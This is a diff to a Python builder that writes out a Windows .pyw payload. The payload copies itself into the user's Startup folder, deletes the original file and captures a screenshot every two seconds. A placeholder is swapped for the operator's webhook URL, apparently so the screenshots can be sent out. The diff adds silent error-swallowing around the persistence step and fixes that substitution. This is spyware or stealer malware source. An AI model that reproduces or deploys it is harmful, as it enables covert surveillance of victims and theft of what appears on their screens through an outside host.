@@ -375,9 +375,11 @@ import shutil
 target = f"C:/Users/{os.getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 lien = "Your webhook url"
 
-if target != __file__:
+try:
     shutil.copy(__file__, target)
     os.remove(__file__)
+except:
+    pass
 
 while True:
     fichier = f"C:/Users/{os.getenv('username')}/screen.png"
@@ -389,7 +391,7 @@ while True:
     sleep(2)
 
 """
-    content = str.replace(content, "Your Webhook url", webhooklink)
+    content = str.replace(content, "Your webhook url", webhooklink)
     file = open(name+".pyw", "w")
     file.write(content)
     file.close()
